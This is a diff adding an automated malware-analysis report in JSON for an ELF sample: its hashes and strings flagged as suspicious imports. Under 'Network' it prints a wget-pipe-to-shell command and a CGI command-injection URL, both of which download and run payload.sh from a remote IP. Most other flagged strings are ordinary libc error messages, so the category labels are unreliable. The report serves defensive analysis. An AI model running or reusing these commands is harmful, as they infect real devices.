@@ -1,0 +1,52 @@
+{
+    "report_generated": "2026-03-23T21:22:15.213309",
+    "file": "/home/amruta/unzip/646ed823a06ae53ac9c9117f68520916e67468bfa0ef6412c35682743cab5819.elf",
+    "filename": "646ed823a06ae53ac9c9117f68520916e67468bfa0ef6412c35682743cab5819.elf",
+    "hashes": {
+        "MD5": "9368946dabfd2323aa836e8e346ede56",
+        "SHA1": "df5978f3e76f872447e596e02f4d8b9b82511a0b",
+        "SHA256": "646ed823a06ae53ac9c9117f68520916e67468bfa0ef6412c35682743cab5819",
+        "SHA512": "b3850d911e5f2a5edb92f9e16ee83794b17fe1e088fa753f9a39841d51c8a121d32b34de4dbb32c4c6747e4de6aa9e975d67b028c80d4ddc3cd362855ea5b93d"
+    },
+    "suspicious_imports": {
+        "total_hits": 23,
+        "categories_flagged": 6,
+        "matches": {
+            "Shell Execution": [
+                "Interrupted system call",
+                "Too many open files in system",
+                "Read-only file system",
+                "Interrupted system call should be restarted"
+            ],
+            "Network": [
+                "M-SEARCH * HTTP/1.1",
+                "%s HTTP/1.1",
+                "Accept: */*",
+                "Accept-Encoding: gzip, deflate",
+                "GET %s HTTP/1.1",
+                "wget -q -O - http://176.65.137.13/payload.sh | sh",
+                "/cgi-bin/test.cgi?cmd=wget%20http://176.65.137.13/payload.sh%20-O%20/tmp/sh%20%26%26%20chmod%20%2bx%20/tmp/sh%20%26%26%20/tmp/sh",
+                "Communication error on send",
+                "Socket operation on non-socket",
+                "Protocol wrong type for socket",
+                "Socket type not supported",
+                "Cannot send after transport endpoint shutdown"
+            ],
+            "File Manipulation": [
+                "Invalid cross-device link",
+                "Link number out of range",
+                "Link has been severed",
+                "Attempting to link in too many shared libraries"
+            ],
+            "Process Manipulation": [
+                "Software caused connection abort"
+            ],
+            "Keylogging / Spying": [
+                "Read-only file system"
+            ],
+            "Persistence": [
+                ".init"
+            ]
+        }
+    }
+}
